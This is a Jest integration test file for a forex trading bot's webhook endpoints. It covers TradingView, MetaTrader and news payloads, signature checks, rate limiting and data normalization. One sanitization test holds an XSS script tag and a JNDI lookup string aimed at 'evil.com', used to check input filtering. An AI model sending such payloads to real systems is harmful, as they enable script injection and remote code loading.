/**
 * Integration Tests for Webhook Integration
 * Tests end-to-end webhook processing and external integrations
 */

const request = require('supertest');
const express = require('express');
const crypto = require('crypto');
const TradingBot = require('../../src/bot/index');
const WebhookProcessor = require('../../src/webhooks/processor');
const AlertManager = require('../../src/alerts/manager');
const logger = require('../../src/utils/logger');

// Mock dependencies
jest.mock('../../src/alerts/manager');
jest.mock('../../src/analysis/engine');

const mockAlertManager = {
    sendTradingSignal: jest.fn().mockResolvedValue({ success: true }),
    sendMarketEvent: jest.fn().mockResolvedValue({ success: true }),
    sendPriceAlert: jest.fn().mockResolvedValue({ success: true })
};

const mockAnalysisEngine = {
    processWebhookData: jest.fn().mockResolvedValue({
        symbol: 'EURUSD',
        analysis: { bias: 'Bullish', confidence: 80 }
    })
};

// Sample webhook payloads
const tradingViewWebhook = {
    symbol: 'EURUSD',
    action: 'BUY',
    price: 1.0850,
    time: '2024-01-01T10:00:00Z',
    strategy: 'Breakout Strategy',
    message: 'Bullish breakout confirmed'
};

const metaTraderWebhook = {
    symbol: 'GBPUSD',
    type: 'SIGNAL',
    operation: 'SELL',
    openPrice: 1.2750,
    stopLoss: 1.2780,
    takeProfit: 1.2700,
    timestamp: 1704110400000,
    comment: 'Resistance level rejection'
};

const newsEventWebhook = {
    event: 'NFP',
    currency: 'USD',
    impact: 'High',
    actual: 200000,
    forecast: 180000,
    previous: 150000,
    timestamp: '2024-01-01T13:30:00Z'
};

describe('Webhook Integration Tests', () => {
    let app;
    let server;
    let webhookProcessor;
    let bot;

    beforeAll(async () => {
        // Initialize bot with test configuration
        bot = new TradingBot();
        app = bot.app;

        // Mock Discord client
        bot.client = {
            user: { tag: 'TestBot#1234' },
            guilds: { cache: { size: 1 } },
            users: { cache: { size: 10 } },
            ws: { ping: 50 },
            readyAt: new Date()
        };

        webhookProcessor = new WebhookProcessor({
            alertManager: mockAlertManager,
            analysisEngine: mockAnalysisEngine,
            security: {
                requireSignature: true,
                allowedIPs: ['127.0.0.1'],
                rateLimiting: {
                    windowMs: 60000,
                    maxRequests: 100
                }
            }
        });

        // Setup webhook routes
        app.post('/webhook/tradingview', webhookProcessor.processTradingView.bind(webhookProcessor));
        app.post('/webhook/metatrader', webhookProcessor.processMetaTrader.bind(webhookProcessor));
        app.post('/webhook/news', webhookProcessor.processNewsEvent.bind(webhookProcessor));
        app.post('/webhook/generic', webhookProcessor.processGeneric.bind(webhookProcessor));

        // Start test server
        server = app.listen(0); // Use random available port
    });

    afterAll(async () => {
        if (server) {
            await new Promise(resolve => server.close(resolve));
        }
    });

    beforeEach(() => {
        jest.clearAllMocks();
        AlertManager.mockImplementation(() => mockAlertManager);
    });

    describe('TradingView Webhook Integration', () => {
        test('should process valid TradingView webhook', async () => {
            const response = await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook)
                .expect(200);

            expect(response.body).toMatchObject({
                success: true,
                message: 'Webhook processed successfully'
            });

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith({
                type: 'external_signal',
                source: 'TradingView',
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                strategy: 'Breakout Strategy',
                message: 'Bullish breakout confirmed',
                timestamp: expect.any(Date)
            });
        });

        test('should handle TradingView webhook with custom strategy', async () => {
            const customWebhook = {
                ...tradingViewWebhook,
                strategy: 'RSI Divergence',
                rsi: 25,
                divergence: 'bullish',
                confluence: ['support_level', 'fibonacci_618']
            };

            const response = await request(app)
                .post('/webhook/tradingview')
                .send(customWebhook)
                .expect(200);

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith(
                expect.objectContaining({
                    strategy: 'RSI Divergence',
                    technicalIndicators: {
                        rsi: 25,
                        divergence: 'bullish'
                    },
                    confluence: ['support_level', 'fibonacci_618']
                })
            );
        });

        test('should validate required TradingView fields', async () => {
            const invalidWebhook = {
                action: 'BUY',
                price: 1.0850
                // Missing required symbol field
            };

            const response = await request(app)
                .post('/webhook/tradingview')
                .send(invalidWebhook)
                .expect(400);

            expect(response.body.error).toContain('Missing required field: symbol');
            expect(mockAlertManager.sendTradingSignal).not.toHaveBeenCalled();
        });

        test('should handle TradingView webhook signature verification', async () => {
            const secret = 'test-secret';
            const payload = JSON.stringify(tradingViewWebhook);
            const signature = crypto
                .createHmac('sha256', secret)
                .update(payload)
                .digest('hex');

            const response = await request(app)
                .post('/webhook/tradingview')
                .set('X-TradingView-Signature', signature)
                .send(tradingViewWebhook)
                .expect(200);

            expect(response.body.success).toBe(true);
        });
    });

    describe('MetaTrader Webhook Integration', () => {
        test('should process valid MetaTrader webhook', async () => {
            const response = await request(app)
                .post('/webhook/metatrader')
                .send(metaTraderWebhook)
                .expect(200);

            expect(response.body).toMatchObject({
                success: true,
                message: 'MetaTrader webhook processed'
            });

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith({
                type: 'external_signal',
                source: 'MetaTrader',
                symbol: 'GBPUSD',
                action: 'SELL',
                entryPrice: 1.2750,
                stopLoss: 1.2780,
                takeProfit: 1.2700,
                comment: 'Resistance level rejection',
                timestamp: expect.any(Date)
            });
        });

        test('should handle MetaTrader position updates', async () => {
            const positionUpdate = {
                ...metaTraderWebhook,
                type: 'POSITION_UPDATE',
                ticket: 12345,
                profit: -150.75,
                status: 'RUNNING'
            };

            const response = await request(app)
                .post('/webhook/metatrader')
                .send(positionUpdate)
                .expect(200);

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith(
                expect.objectContaining({
                    type: 'position_update',
                    ticket: 12345,
                    profit: -150.75,
                    status: 'RUNNING'
                })
            );
        });

        test('should calculate risk/reward ratio for MetaTrader signals', async () => {
            const response = await request(app)
                .post('/webhook/metatrader')
                .send(metaTraderWebhook)
                .expect(200);

            const sentAlert = mockAlertManager.sendTradingSignal.mock.calls[0][0];

            // SELL signal: Entry 1.2750, SL 1.2780, TP 1.2700
            // Risk: 30 pips, Reward: 50 pips, R:R = 1.67
            expect(sentAlert.riskRewardRatio).toBeCloseTo(1.67, 1);
        });
    });

    describe('News Event Webhook Integration', () => {
        test('should process economic news webhook', async () => {
            const response = await request(app)
                .post('/webhook/news')
                .send(newsEventWebhook)
                .expect(200);

            expect(response.body.success).toBe(true);

            expect(mockAlertManager.sendMarketEvent).toHaveBeenCalledWith({
                type: 'news_event',
                event: 'NFP',
                currency: 'USD',
                impact: 'High',
                actual: 200000,
                forecast: 180000,
                previous: 150000,
                deviation: 20000,
                timestamp: expect.any(Date)
            });
        });

        test('should classify news impact correctly', async () => {
            const highImpactNews = {
                ...newsEventWebhook,
                event: 'FOMC Rate Decision',
                actual: 5.5,
                forecast: 5.25,
                impact: 'High'
            };

            await request(app)
                .post('/webhook/news')
                .send(highImpactNews)
                .expect(200);

            const sentEvent = mockAlertManager.sendMarketEvent.mock.calls[0][0];
            expect(sentEvent.priority).toBe('high');
            expect(sentEvent.affectedCurrencies).toContain('USD');
        });

        test('should handle news events with market reaction', async () => {
            const newsWithReaction = {
                ...newsEventWebhook,
                marketReaction: {
                    EURUSD: { change: -0.0025, direction: 'down' },
                    GBPUSD: { change: -0.0018, direction: 'down' },
                    USDJPY: { change: 1.25, direction: 'up' }
                }
            };

            await request(app)
                .post('/webhook/news')
                .send(newsWithReaction)
                .expect(200);

            const sentEvent = mockAlertManager.sendMarketEvent.mock.calls[0][0];
            expect(sentEvent.marketReaction).toBeDefined();
            expect(sentEvent.marketReaction.EURUSD.change).toBe(-0.0025);
        });
    });

    describe('Generic Webhook Processing', () => {
        test('should handle custom webhook formats', async () => {
            const customWebhook = {
                source: 'CustomBot',
                data: {
                    symbol: 'AUDUSD',
                    signal: 'STRONG_BUY',
                    indicators: {
                        macd: 'bullish_crossover',
                        rsi: 35,
                        ema: 'price_above'
                    }
                },
                timestamp: Date.now()
            };

            const response = await request(app)
                .post('/webhook/generic')
                .send(customWebhook)
                .expect(200);

            expect(mockAnalysisEngine.processWebhookData).toHaveBeenCalledWith(
                'CustomBot',
                customWebhook.data
            );
        });

        test('should transform webhook data to standard format', async () => {
            const nonStandardWebhook = {
                pair: 'EUR/USD',
                side: 'long',
                entry: 1.0850,
                sl: 1.0820,
                tp: 1.0900,
                reason: 'Bullish engulfing pattern'
            };

            await request(app)
                .post('/webhook/generic')
                .send(nonStandardWebhook)
                .expect(200);

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith(
                expect.objectContaining({
                    symbol: 'EURUSD', // Normalized from EUR/USD
                    action: 'BUY',    // Normalized from 'long'
                    entryPrice: 1.0850,
                    stopLoss: 1.0820,
                    takeProfit: 1.0900
                })
            );
        });
    });

    describe('Webhook Security and Validation', () => {
        test('should validate webhook signatures when required', async () => {
            const webhookWithBadSignature = {
                ...tradingViewWebhook
            };

            const response = await request(app)
                .post('/webhook/tradingview')
                .set('X-Signature', 'invalid-signature')
                .send(webhookWithBadSignature)
                .expect(401);

            expect(response.body.error).toContain('Invalid signature');
            expect(mockAlertManager.sendTradingSignal).not.toHaveBeenCalled();
        });

        test('should enforce IP whitelist when configured', async () => {
            // Test with non-whitelisted IP would require mocking request IP
            // This is a conceptual test - actual implementation would use req.ip
            const response = await request(app)
                .post('/webhook/tradingview')
                .set('X-Forwarded-For', '192.168.1.100') // Non-whitelisted IP
                .send(tradingViewWebhook);

            // Implementation would check IP and return 403 if not whitelisted
            if (response.status === 403) {
                expect(response.body.error).toContain('IP not whitelisted');
            }
        });

        test('should sanitize webhook input data', async () => {
            const maliciousWebhook = {
                symbol: 'EURUSD',
                action: 'BUY',
                message: '<script>alert("xss")</script>',
                comment: '${jndi:ldap://evil.com/a}'
            };

            const response = await request(app)
                .post('/webhook/tradingview')
                .send(maliciousWebhook)
                .expect(200);

            const sentAlert = mockAlertManager.sendTradingSignal.mock.calls[0][0];

            // Should sanitize potentially malicious content
            expect(sentAlert.message).not.toContain('<script>');
            expect(sentAlert.comment).not.toContain('${jndi:');
        });

        test('should enforce rate limiting', async () => {
            const requests = [];

            // Send multiple requests rapidly
            for (let i = 0; i < 105; i++) { // Exceed rate limit of 100
                requests.push(
                    request(app)
                        .post('/webhook/tradingview')
                        .send(tradingViewWebhook)
                );
            }

            const responses = await Promise.allSettled(requests);
            const rateLimitedResponses = responses.filter(
                result => result.value?.status === 429
            );

            expect(rateLimitedResponses.length).toBeGreaterThan(0);
        });
    });

    describe('Webhook Error Handling', () => {
        test('should handle malformed JSON gracefully', async () => {
            const response = await request(app)
                .post('/webhook/tradingview')
                .set('Content-Type', 'application/json')
                .send('{"symbol": "EURUSD", "action":}') // Malformed JSON
                .expect(400);

            expect(response.body.error).toContain('Invalid JSON');
        });

        test('should handle processing errors gracefully', async () => {
            // Mock alert manager to fail
            mockAlertManager.sendTradingSignal.mockRejectedValue(
                new Error('Alert delivery failed')
            );

            const response = await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook)
                .expect(500);

            expect(response.body.error).toContain('Processing failed');

            // Should log the error
            expect(logger.error).toHaveBeenCalledWith(
                expect.stringContaining('Webhook processing error'),
                expect.any(Object)
            );
        });

        test('should continue processing other webhooks after failure', async () => {
            // First webhook fails
            mockAlertManager.sendTradingSignal
                .mockRejectedValueOnce(new Error('Temporary failure'))
                .mockResolvedValue({ success: true });

            // First request fails
            await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook)
                .expect(500);

            // Second request should succeed
            const response = await request(app)
                .post('/webhook/tradingview')
                .send({
                    ...tradingViewWebhook,
                    symbol: 'GBPUSD'
                })
                .expect(200);

            expect(response.body.success).toBe(true);
        });
    });

    describe('Webhook Analytics and Monitoring', () => {
        test('should track webhook processing metrics', async () => {
            await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook);

            await request(app)
                .post('/webhook/metatrader')
                .send(metaTraderWebhook);

            const metrics = webhookProcessor.getMetrics();

            expect(metrics).toMatchObject({
                totalWebhooks: 2,
                successfulProcessed: 2,
                failedProcessed: 0,
                averageProcessingTime: expect.any(Number),
                sourceBreakdown: {
                    tradingview: 1,
                    metatrader: 1
                }
            });
        });

        test('should monitor webhook processing performance', async () => {
            const startTime = Date.now();

            await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook);

            const processingTime = Date.now() - startTime;

            // Should process webhook quickly (< 1 second)
            expect(processingTime).toBeLessThan(1000);

            const metrics = webhookProcessor.getMetrics();
            expect(metrics.averageProcessingTime).toBeLessThan(500);
        });

        test('should track webhook source reliability', async () => {
            // Simulate successful webhook
            await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook);

            // Simulate failed webhook
            mockAlertManager.sendTradingSignal.mockRejectedValue(
                new Error('Processing failed')
            );

            await request(app)
                .post('/webhook/tradingview')
                .send(tradingViewWebhook);

            const reliability = webhookProcessor.getSourceReliability('tradingview');

            expect(reliability).toMatchObject({
                source: 'tradingview',
                totalRequests: 2,
                successfulRequests: 1,
                failedRequests: 1,
                reliabilityScore: 0.5
            });
        });
    });

    describe('Webhook Data Transformation', () => {
        test('should normalize different timestamp formats', async () => {
            const webhooksWithDifferentTimestamps = [
                { ...tradingViewWebhook, time: '2024-01-01T10:00:00Z' },
                { ...tradingViewWebhook, time: '2024-01-01 10:00:00' },
                { ...tradingViewWebhook, time: 1704110400000 },
                { ...tradingViewWebhook, time: '1704110400' }
            ];

            for (const webhook of webhooksWithDifferentTimestamps) {
                await request(app)
                    .post('/webhook/tradingview')
                    .send(webhook)
                    .expect(200);
            }

            // All calls should have normalized timestamp as Date object
            const allCalls = mockAlertManager.sendTradingSignal.mock.calls;
            allCalls.forEach(call => {
                expect(call[0].timestamp).toBeInstanceOf(Date);
            });
        });

        test('should handle currency pair format variations', async () => {
            const variations = [
                { ...tradingViewWebhook, symbol: 'EURUSD' },
                { ...tradingViewWebhook, symbol: 'EUR/USD' },
                { ...tradingViewWebhook, symbol: 'EUR_USD' },
                { ...tradingViewWebhook, symbol: 'eurusd' }
            ];

            for (const webhook of variations) {
                await request(app)
                    .post('/webhook/tradingview')
                    .send(webhook)
                    .expect(200);
            }

            // All should be normalized to 'EURUSD'
            const allCalls = mockAlertManager.sendTradingSignal.mock.calls;
            allCalls.forEach(call => {
                expect(call[0].symbol).toBe('EURUSD');
            });
        });

        test('should convert action formats consistently', async () => {
            const actionVariations = [
                { ...tradingViewWebhook, action: 'BUY' },
                { ...tradingViewWebhook, action: 'buy' },
                { ...tradingViewWebhook, action: 'LONG' },
                { ...tradingViewWebhook, action: 'long' },
                { ...tradingViewWebhook, action: '1' }
            ];

            for (const webhook of actionVariations) {
                await request(app)
                    .post('/webhook/tradingview')
                    .send(webhook)
                    .expect(200);
            }

            // All should be normalized to 'BUY'
            const allCalls = mockAlertManager.sendTradingSignal.mock.calls;
            allCalls.forEach(call => {
                expect(call[0].action).toBe('BUY');
            });
        });
    });

    describe('Webhook Integration with Analysis Engine', () => {
        test('should trigger analysis on webhook receipt', async () => {
            const webhookWithAnalysisRequest = {
                ...tradingViewWebhook,
                requestAnalysis: true,
                analysisTimeframe: '1h'
            };

            await request(app)
                .post('/webhook/tradingview')
                .send(webhookWithAnalysisRequest)
                .expect(200);

            expect(mockAnalysisEngine.processWebhookData).toHaveBeenCalledWith(
                'TradingView',
                expect.objectContaining({
                    symbol: 'EURUSD',
                    requestAnalysis: true
                })
            );
        });

        test('should enrich webhook signals with analysis data', async () => {
            mockAnalysisEngine.processWebhookData.mockResolvedValue({
                symbol: 'EURUSD',
                analysis: {
                    bias: 'Bullish',
                    confidence: 85,
                    keyLevel: 1.0850,
                    supportLevels: [1.0820, 1.0800],
                    resistanceLevels: [1.0880, 1.0900]
                }
            });

            const response = await request(app)
                .post('/webhook/tradingview')
                .send({ ...tradingViewWebhook, requestAnalysis: true })
                .expect(200);

            expect(mockAlertManager.sendTradingSignal).toHaveBeenCalledWith(
                expect.objectContaining({
                    analysis: expect.objectContaining({
                        bias: 'Bullish',
                        confidence: 85
                    })
                })
            );
        });
    });
});